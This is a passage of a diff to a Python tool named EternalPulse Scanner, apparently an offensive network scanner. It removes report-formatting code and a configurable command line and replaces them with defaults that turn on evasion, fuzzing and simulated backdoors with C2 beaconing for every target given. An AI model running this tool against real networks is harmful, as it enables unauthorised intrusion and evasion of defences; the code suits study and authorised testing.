-        <p><strong>Targets scanned:</strong> {len(self.results)}</p>
-        <p><strong>Evasion techniques used:</strong> {', '.join([f'{k} ({v})' for k, v in self.evasion_metrics.items() if v > 0])}</p>
-    </div>
-    
-    <h2>Scan Results</h2>"""
-        
-        for target, data in self.results.items():
-            # Threat level indicator
-            threat_level = ThreatLevel.INFO
-            if data.get('vulnerabilities'):
-                max_threat = max(v.get('threat_level', 0) for v in data['vulnerabilities'])
-                threat_level = ThreatLevel(max_threat)
-            
-            threat_class = f"threat-{threat_level.name.lower()}"
-            
-            html += f"""
-    <div class="target">
-        <h3><span class="{threat_class}">■</span> {target}</h3>
-        <p><strong>Scan time:</strong> {data['timestamp']}</p>
-        
-        <h4>Open Ports:</h4>
-        <ul>"""
-            
-            for port, info in data['ports'].items():
-                if "open" in info['status']:
-                    status_class = "port-open" if "open" in info['status'] else "port-filtered"
-                    proto = info['fingerprint']['protocol']
-                    version = info['fingerprint']['version']
-                    html += f"""
-            <li><span class="{status_class}">{port}</span>: 
-                {info['status']} - {proto} {version}</li>"""
-            
-            html += """
-        </ul>"""
-            
-            if data.get('dns'):
-                html += """
-        <h4>DNS Information:</h4>
-        <ul>"""
-                for rtype, records in data['dns'].items():
-                    html += f"""
-            <li><strong>{rtype}:</strong> {', '.join(records)}</li>"""
-                html += """
-        </ul>"""
-            
-            if data.get('vulnerabilities'):
-                html += """
-        <h4>Vulnerabilities:</h4>"""
-                for vuln in data['vulnerabilities']:
-                    risk_class = f"vuln-{vuln['risk'].lower()}"
-                    html += f"""
-        <div class="{risk_class}">
-            <strong>{vuln['name']}</strong> ({vuln['cve']}) - {vuln['risk']} risk<br>
-            {vuln['details']}
-        </div>"""
-            
-            if data.get('fuzzing'):
-                html += """
-        <h4>Fuzzing Results:</h4>
-        <div class="fuzzing-results">"""
-                for port, fuzz in data['fuzzing'].items():
-                    html += f"""
-            <div style="margin-bottom: 15px;">
-                <h5>Port {port} ({fuzz['protocol']})</h5>
-                <div class="fuzzing-stats">
-                    <div class="stat-card">
-                        <strong>{fuzz['crashes']}</strong> crashes<br>
-                        <small>({fuzz['unique_crashes']} unique)</small>
-                    </div>
-                    <div class="stat-card">
-                        <strong>{fuzz['anomalies']}</strong> anomalies<br>
-                        <small>({fuzz['unique_anomalies']} unique)</small>
-                    </div>
-                    <div class="stat-card">
-                        <strong>{fuzz['coverage']}</strong> responses<br>
-                        <small>unique patterns</small>
-                    </div>
-                    <div class="stat-card">
-                        <strong>{fuzz['generations']}</strong> generations<br>
-                        <small>{fuzz['tested_payloads']} payloads</small>
-                    </div>
-                </div>"""
-                    
-                    if fuzz.get('crash_samples'):
-                        html += """
-                <h6>Crash Payload Samples:</h6>"""
-                        for sample in fuzz['crash_samples']:
-                            html += f"""
-                <div class="payload-sample">{sample}</div>"""
-                    
-                    if fuzz.get('anomaly_samples'):
-                        html += """
-                <h6>Anomaly Payload Samples:</h6>"""
-                        for sample in fuzz['anomaly_samples']:
-                            html += f"""
-                <div class="payload-sample">{sample}</div>"""
-                    
-                    html += """
-            </div>"""
-                html += """
-        </div>"""
-            
-            if data.get('backdoors'):
-                html += """
-        <h4>Backdoor Simulations:</h4>"""
-                for bd in data['backdoors']:
-                    backdoor = bd['backdoor']
-                    html += f"""
-        <div style="background-color: #ffebee; padding: 10px; border-radius: 4px; margin: 10px 0;">
-            <strong>{backdoor['type']} backdoor</strong> ({backdoor['id']})<br>
-            Protocol: {backdoor['protocol']}:{backdoor['port']}<br>
-            Persistence: {backdoor['persistence']}<br>
-            C2: {backdoor['c2_protocol']} every {backdoor['beacon_interval']}s
-        </div>
-        <h5>C2 Activity:</h5>"""
-                    
-                    for beacon in bd['beacons']:
-                        html += f"""
-        <div class="c2-activity">
-            {beacon['time']}: {beacon['command']} command ({beacon['payload_size']} bytes)
-        </div>"""
-            
-            html += """
-    </div>"""
-        
-        html += """
-</body>
-</html>"""
-        return html
-
-    def _generate_text_report(self) -> str:
-        """Generate human-readable text report with fuzzing details"""
-        report = f"EternalPulse Scanner Report v{VERSION}\n"
-        report += f"Scan started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S %Z')}\n"
-        report += f"Targets scanned: {len(self.results)}\n"
-        report += f"Evasion techniques used: {json.dumps(self.evasion_metrics)}\n\n"
-        
-        for target, data in self.results.items():
-            report += f"Target: {target}\n"
-            report += f"Scan time: {data['timestamp']}\n"
-            
-            report += "Open ports:\n"
-            for port, info in data['ports'].items():
-                if "open" in info['status']:
-                    proto = info['fingerprint']['protocol']
-                    version = info['fingerprint']['version']
-                    report += f"  {port}: {info['status']} ({proto} {version})\n"
-            
-            if data.get('vulnerabilities'):
-                report += "Vulnerabilities:\n"
-                for vuln in data['vulnerabilities']:
-                    report += f"  {vuln['name']} ({vuln['cve']}) - {vuln['risk']} risk\n"
-                    report += f"  Details: {vuln['details']}\n"
-            
-            if data.get('fuzzing'):
-                report += "Fuzzing Results:\n"
-                for port, fuzz in data['fuzzing'].items():
-                    report += f"  Port {port} ({fuzz['protocol']}):\n"
-                    report += f"    Crashes: {fuzz['crashes']} ({fuzz['unique_crashes']} unique)\n"
-                    report += f"    Anomalies: {fuzz['anomalies']} ({fuzz['unique_anomalies']} unique)\n"
-                    report += f"    Coverage: {fuzz['coverage']} unique responses\n"
-                    report += f"    Tested: {fuzz['tested_payloads']} payloads over {fuzz['generations']} generations\n"
-                    
-                    if fuzz.get('crash_samples'):
-                        report += "    Crash payload samples:\n"
-                        for sample in fuzz['crash_samples'][:2]:
-                            report += f"      {sample}\n"
-                    
-                    if fuzz.get('anomaly_samples'):
-                        report += "    Anomaly payload samples:\n"
-                        for sample in fuzz['anomaly_samples'][:2]:
-                            report += f"      {sample}\n"
-            
-            if data.get('backdoors'):
-                report += "Backdoor Simulations:\n"
-                for bd in data['backdoors']:
-                    backdoor = bd['backdoor']
-                    report += f"  {backdoor['type']} ({backdoor['id']}) via {backdoor['protocol']}:{backdoor['port']}\n"
-                    report += f"  Persistence: {backdoor['persistence']}, C2: {backdoor['c2_protocol']}\n"
-                    report += "  C2 Activity:\n"
-                    for beacon in bd['beacons']:
-                        report += f"    {beacon['time']}: {beacon['command']} command ({beacon['payload_size']} bytes)\n"
-            
-            report += "\n"
-        
-        return report
-
     def save_report(self, file_path: str):
         """Save report to file"""
         report = self.generate_report()
@@ -1805,34 +1473,15 @@ class EternalPulseScanner:
 
 
 if __name__ == "__main__":
-    import argparse
-
-    parser = argparse.ArgumentParser(
-        description="EternalPulse Scanner 5.1 - Advanced Network Reconnaissance",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter
-    )
-    parser.add_argument("targets", nargs="+", help="Hosts or networks to scan")
-    parser.add_argument("-o", "--output", help="Output file path")
-    parser.add_argument("-f", "--format", choices=["json", "html", "text"], default="json",
-                        help="Report format")
-    parser.add_argument("-t", "--timeout", type=float, default=3.0,
-                        help="Connection timeout in seconds")
-    parser.add_argument("-w", "--workers", type=int, default=50,
-                        help="Number of parallel workers")
-    parser.add_argument("-s", "--stealth", type=int, choices=[1, 2, 3, 4], default=2,
-                        help="Stealth level (1=verbose, 4=silent)")
-    parser.add_argument("-i", "--intensity", type=int, choices=[1, 2, 3, 4, 5], default=3,
-                        help="Scan intensity (1=light, 5=comprehensive)")
-    parser.add_argument("--no-evasion", action="store_true", help="Disable evasion techniques")
-    parser.add_argument("--no-vuln", action="store_true", help="Disable vulnerability scanning")
-    parser.add_argument("--backdoor", action="store_true", help="Simulate backdoor installation")
-    parser.add_argument("--fuzz", action="store_true", help="Enable enhanced protocol fuzzing")
-    args = parser.parse_args()
-
+    # Parse targets from command line arguments
+    if len(sys.argv) < 2:
+        print("Usage: ./scanner.py target1 [target2 ...]")
+        sys.exit(1)
+    
     # Expand CIDR ranges
     expanded_targets = []
-    for target in args.targets:
-        if "/" in target:
+    for target in sys.argv[1:]:
+        if '/' in target:
             try:
                 network = ipaddress.ip_network(target, strict=False)
                 expanded_targets.extend(str(ip) for ip in network.hosts())
@@ -1840,27 +1489,25 @@ if __name__ == "__main__":
                 expanded_targets.append(target)
         else:
             expanded_targets.append(target)
-
+    
+    # Create scanner with optimized SMB settings
     scanner = EternalPulseScanner(
-        timeout=args.timeout,
-        workers=args.workers,
-        stealth_level=args.stealth,
-        scan_intensity=args.intensity,
-        evasion_mode=not args.no_evasion,
-        vulnerability_scan=not args.no_vuln,
-        backdoor_sim=args.backdoor,
-        fuzzing=args.fuzz,
-        output_format=args.format
+        timeout=3,
+        workers=100,
+        stealth_level=2,
+        scan_intensity=5,
+        evasion_mode=True,
+        vulnerability_scan=True,
+        backdoor_sim=True,
+        fuzzing=True,
+        output_format="json"
     )
     
+    # Perform scan
     scanner.scan(expanded_targets)
     
-    # Auto-save results if fuzzing is enabled and no output specified
-    if args.fuzz and not args.output:
-        args.output = "results.json"
-    
-    if args.output:
-        scanner.save_report(args.output)
-        print(f"Report saved to {args.output}")
-    else:
-        print(scanner.generate_report())
+    # Save results
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    report_file = f"scan_results_{timestamp}.json"
+    scanner.save_report(report_file)
+    print(f"Scan completed. Results saved to {report_file}")
